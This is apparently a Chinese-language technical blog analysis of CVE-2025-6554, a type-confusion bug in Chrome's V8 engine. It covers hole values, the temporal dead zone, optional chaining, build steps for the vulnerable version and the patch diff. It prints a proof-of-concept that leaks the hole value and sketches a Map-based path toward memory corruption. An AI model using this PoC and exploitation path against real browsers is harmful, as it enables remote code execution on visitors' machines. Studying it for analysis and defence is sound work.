---
title: Chrome V8 类型混淆漏洞 // CVE-2025-6554 分析
published: true
---

| 目录跳转 |
|--------|
| [特性及机制详解](#特性及机制详解) |
| [&nbsp;&nbsp;&nbsp;&nbsp;hole](#hole) |
| [&nbsp;&nbsp;&nbsp;&nbsp;与 hole 关联的 TDZ](#与-hole-关联的-tdz) |
| [&nbsp;&nbsp;&nbsp;&nbsp;可选链](#可选链) |
| [V8 Build 方法](#v8-build-方法) |
| [漏洞分析](#漏洞分析) |
| [&nbsp;&nbsp;&nbsp;&nbsp;可能的利用方法](#可能的利用方法) |

近日，Chrome 浏览器中的 JS 引擎 V8 被披露存在一个严重的内存访问漏洞，编号为 CVE-2025-6554. 该漏洞影响广泛，危害等级为高危. 

该漏洞本质上属于类型混淆 (Type Confusion)，攻击者可通过构造特定的 JS 代码，在不经过用户交互的情况下触发浏览器崩溃，有可能实现远程代码执行 (RCE) .这意味着，一旦用户访问了恶意网站，攻击者便可能在受害者设备上执行任意代码，造成严重的安全后果. 本文笔者将采用 V8 13.5.212.10 该还未修复漏洞的版本作为主要漏洞调试版本.

先贴验证 PoC: 

```js
function f() {
    let x;
    delete x?.[y]?.a;
    return y;
    let y;
}
let hole = f();
let map = new Map();
map.delete(hole);
```

笔者在本文中将会先说明 V8 引擎语言特性再逐步分析触发方法.

# [](#header-3)特性及机制详解

V8 是一个独立的 JS 引擎，Chrome 是一个基于 V8 引擎构建的浏览器，本漏洞与 V8 引擎离不开关系.

在介绍该漏洞之前先介绍与该漏洞有关的三个 V8 引擎的特性及机制：hole、TDZ、可选链

## [](#header-3)hole

`hole` 机制是 V8 内部设计的一部分，用于区分未初始化、删除后的数组槽位、TDZ 状态等多种情况. 正常情况下它不应被暴露到 JavaScript 代码中. 

以数组举个例子：在稀疏数组或被 delete 操作后，V8 会将这些"空槽"标记为 `hole`，区别于存放的 `undefined`，来区分"未存在"和"存在但值为 `undefined`"这两种情况，如下所示：

```js
const arr = [1 , ,3 ];
// arr[1] 实际上是 hole，但访问时会被 coerced 为 undefined
console.log(arr[1]);
```

笔者再以 map 举个例子：在 map 中的元素被 delete 操作后，V8 将会将键值标记为 `hole`，其状况如下所示：

```js
const m = new Map();
m.set(1, 'one');
m.delete(1);

// 现在：m.size === 0，
// 但 Map 内部的 "1" 那槽仍保留为 hole，仅作标记
```

除了区分上面所演示的数组空槽外，`hole` 还有另外一个用途：在 TDZ 中区分未初始化的变量.

## [](#header-3)与 hole 关联的 TDZ

TDZ 指的是"Temporal Dead Zone"，这是 ES6（ES2015）引入的一种语义概念，针对 let 和 const 声明的变量. 

在一个代码块开始后碰到某个变量，直到遇到该变量的声明这段区间就是 TDZ (必须是 let 或 const 形式的声明，若变量以 var 声明则不存在 TDZ) . 例如：

```js
1| {
2|   console.log(x);
3|   let x = 10;
4|   console.log(x);
5| }
```

在以上代码中，第 1 行到第 3 行区间即为 TDZ

#### [](#header-3)为什么要有 TDZ

我们都知道，在以往的 JS 中输出一个未初始化变量时，将会直接输出 `undefined`，这是不存在 TDZ 机制的情况，如下所示：

```js
> console.log(a);
  var a = 1;
< undefined
```

这样的机制在开发中及其容易产生 bug. 

为了保护安全、减少代码错误，引入了 TDZ 机制：当程序流进入一个作用域 (比如函数或 {} 块) 时，内部声明的 let 和 const 变量会被先提升 (hoist) 至作用域顶部，但不会立即初始化，并且在赋值前不会使用. 因此若你在赋值前使用，则会抛出 ReferenceError，而非输出 `undefined`，如下所示：

```js
> console.log(a);
  let a = 1;
❌ Uncaught ReferenceError: a is not defined
    at <anonymous>:1:13
```

如上所示，在真正执行到声明语句之前，该变量处于 “死区” 内，访问就会抛出 ReferenceError. 

#### [](#header-3)TDZ 与 hole 之间的关系

笔者先前提到，hole 可用于区分未初始化的变量

当你访问一个 let 声明但尚未初始化的变量时，变量处于 TDZ，在 V8 内部会认为其值是 hole，例如这段代码: 

```js
{ 
    ...
    console.log(y);   // 变量 y 被标记为 hole
    let y;            // 变量 y 被初始化为 undefined，该行执行完后续不再为 hole
}
```

在执行 `console.log(y);` 时，`y` 已经被提升（hoisted）到了当前作用域，但还没有被初始化，所以仍处于 TDZ. 此时，`y` 被标记为 hole，代表"尚未初始化"或"槽位为空"

下列代码同理: 

```js
function () {
    ...
    return y;         // 变量 y 被标记为 hole
    let y; 
}
```

## [](#header-3)可选链

可选链 (Optional Chaining) 是 ECMAScript 2020 中新增的一个 JS 特性，用于简化访问嵌套对象属性或调用函数时的空值检查. 例如：

```js
const city = user?.address?.city;

//逻辑大致等同于
let city;
if (user != null && user.address != null) {
    city = user.address.city;
} else {
    city = undefined;
}
```

这样的访问方法不仅限于嵌套对象，也包含数组类型. 例如：

```js
const b =  x?.[y]?.a;

//逻辑大致等同于
let b;
if (x != null && x[y] != null) {
    b = x[y].a;
} else {
    b = undefined;
}
```

同时，可选链也可以删除嵌套对象中的某个特定对象. 例如：

```js
delete x?.[y]?.a; 

//逻辑大致等同于
if (x != null && x[y] != null && x[y].a != null) {
    delete x[y].a;
}
```

# [](#header-3)V8 Build 方法

在开始分析前再看一下如何 Build 有漏洞的 V8 13.5.212.10 版本

```bash
# 拉取 depot_tools
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
export PATH="$PWD/depot_tools:$PATH"

# 克隆 V8 仓库并切换至有漏洞的版本 13.5.212.10
git clone https://chromium.googlesource.com/v8/v8.git
cd v8
git checkout 13.5.212.10

# 拉取子模块并同步依赖
git submodule update --init
cd ..
gclient config https://chromium.googlesource.com/v8/v8
gclient sync --with_branch_heads
(若在此步骤发生 commit 错误，输入以下命令后重新 gclient 操作：cd v8; git reset --hard HEAD; git clean -fd;)

# Build
cd v8
tools/dev/v8gen.py x64.release
ninja -C out.gn/x64.release d8
```

13.5.212.10 版本的 V8 将生成在 /v8/out.gn/x64.release/ 路径下，你可以通过以下命令运行 js 代码：

```bash
./v8/out.gn/x64.release/d8 test.js
```

# [](#header-3)漏洞分析

在了解完与该漏洞相关的三大特性与机制：hole、TDZ、可选链 以及 Built V8 后，笔者来正式解析漏洞

在 JS 中，let 和 const 声明的变量在声明之前处于 TDZ 状态，无法访问. 然而，V8 引擎在处理可选链时，错误地将处于 TDZ 状态的变量视为已定义，即没有校验是否为 hole，这给了我们可乘之机：

`V8 13.5.212.10 (存在漏洞版本的代码)`
```cpp
class V8_NODISCARD BytecodeGenerator::OptionalChainNullLabelScope final {
 public:
  explicit OptionalChainNullLabelScope(BytecodeGenerator* bytecode_generator)
      : bytecode_generator_(bytecode_generator),
        labels_(bytecode_generator->zone()) { //老版本的代码
    prev_ = bytecode_generator_->optional_chaining_null_labels_;
    bytecode_generator_->optional_chaining_null_labels_ = &labels_;
  }

  ~OptionalChainNullLabelScope() {
    bytecode_generator_->optional_chaining_null_labels_ = prev_;
  }
  ...
```

`V8 13.9.205.8 (官方修复后的代码，可以观察到，此处利用 hole_check_scope_ 函数添加了对 hole 的校验)`
```cpp
class V8_NODISCARD BytecodeGenerator::OptionalChainNullLabelScope final {
 public:
  explicit OptionalChainNullLabelScope(BytecodeGenerator* bytecode_generator)
      : bytecode_generator_(bytecode_generator),
        labels_(bytecode_generator->zone()),
        hole_check_scope_(bytecode_generator) { //可以观察到，此处添加了结构 hole_check_scope_
    prev_ = bytecode_generator_->optional_chaining_null_labels_;
    bytecode_generator_->optional_chaining_null_labels_ = &labels_;
  }

  ~OptionalChainNullLabelScope() {
    bytecode_generator_->optional_chaining_null_labels_ = prev_;
  }
  ...
```

观察上面修复前/修复后的代码，发现在存在漏洞的旧版本中由于缺少如下结构：

```cpp
HoleCheckElisionScope  hole_check_scope_
```

可以直接在可选链 `delete x?.[y]?.a` 中：

1. 跳过对 hole 值的检查
2. 在整个可选链操作过程中保持 hole 检查一致. 

换句话说，当代码逻辑运行至 `detele x?` 时，此时未检测到 hole，将会保持后续检查 `detele x?.[y]?` 及操作 `delete x?.[y]?.a` 对 hole 值检测结果的一致性即：不存在 `hole`，因此误将 `y` 正常处理. 

那么现在可能有读者疑问了：在可选链中缺少对 hole 的检查，关后续函数逻辑什么事？后续程序逻辑不会抛出 ReferenceError 吗？笔者将引入 `HoleCheckElisionScope` 的优化机制以解释为什么后续程序逻辑不会抛出 ReferenceError.

我们刚刚提到，在 V8 中存在 `HoleCheckElisionScope`，这是 V8 中用于 控制"是否需要检查 TDZ/hole"的编译时作用域控制机制，它确保可选链在执行过程中对 `hole` 值进行严格检查，而不会在优化中被意外跳过. 

而在旧版本中的如下结构，将会导致不同环节使用不同的检查策略，并且在某些情况下跳过 hole 检查，如下所示

```cpp
// 旧版本：每个可选链环节独立判断是否跳过 hole 检查
HoleCheckElisionScope elider(this);
expression_func();  // 执行可选链解析
```

```cpp
// 修复后的版本：整个可选链使用统一的 hole 检查作用域
HoleCheckElisionScope hole_check_scope_(this);
expression_func();  // 执行可选链解析
```

在旧版本中，为了提高性能，在以下情况下将忽略对 hole 的检查：

1. 如果某个变量之前已经被确认不是 hole
2. 如果某个上下文没有明确需要检查

因此旧版与未修复的版本中当 `delete x?.[y]?.a;` 中的 hole 值 `y` 已被进行处理后，`y` 将依旧保持为 `hole`，但后续将会忽略对 `y` 的检查，并且 `return y` 以及后续的操作将会正常执行，不会抛出 ReferenceError. 如下例子所示：

```js
function f() {
    let x;
    delete x?.[y]?.a; //可选链处理
    return y;         //由于可选链中默认 check 过 hole 并且 HoleCheckElisionScope 的优化机制，此处不再 check hole
    let y;
}
let hole = f();
//此时的 hole 是合法 hole 值
```

此时我们合法的获取到了 `hole` 值，在后续操作中我们可以利用 `hole` 非法访问某些地址

## [](#header-3)在老版本中可能的利用方法

利用 `map.set(hole, someValue)` 与 `map.delete(hole)` 的特殊机制：

`一个可能的利用路径`
```js
let map = new Map();
m.set(hole, 1);
m.delete(hole);
m.delete(hole);
```

观察上面可能的利用路径：

首先向 map 中插入 `hole` 作为一个键.

当第一次删除键 `hole` ，由于 hole 机制，V8 会将该槽的 key 置为 `hole` 作为占用目的，value 同样置为 `hole`，此时 map size--（size 从 1 变成 0），但槽依旧保留在内部数组中. 

当第二次删除键 `hole`，由于槽中 key 仍旧是 `hole`（上次由于 hole 机制已经设为 `hole`），于是 delete 的 mmap 会再次匹配并执行删除. 最终，size 变成 -1，再次调用 `map.set` 将会写入出乎意料的非法内存地址，为后续 RCE 铺路. 

```js
function f() {
    let x;
    delete x?.[y]?.a;
    return y;
    let y;
}
let hole = f();
let map = new Map();
map.delete(hole);
```

此文章由leeya_bug创作，禁止抄袭转载  
(完)
